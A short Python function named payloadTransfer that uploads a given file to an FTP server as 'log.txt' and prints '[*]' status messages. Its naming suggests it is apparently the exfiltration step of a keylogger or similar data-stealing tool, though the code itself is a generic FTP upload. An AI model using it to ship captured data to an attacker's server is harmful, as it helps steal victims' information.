def payloadTransfer(file, server_address, server_port, server_username, server_password):
    try:  
        session = ftplib.FTP()
        session.connect(server_address, server_port)
        #session.login(server_username, server_password)
        session.login(server_username, server_password)
        file = open(f"{file}", "rb")
        session.storbinary("STOR log.txt", file)
        file.close()
        print("[*] File uploaded successfully")
        session.quit()
        print("[*] Disconnected from FTP server")

    except Exception as e:
        print(f"Error {e}", )
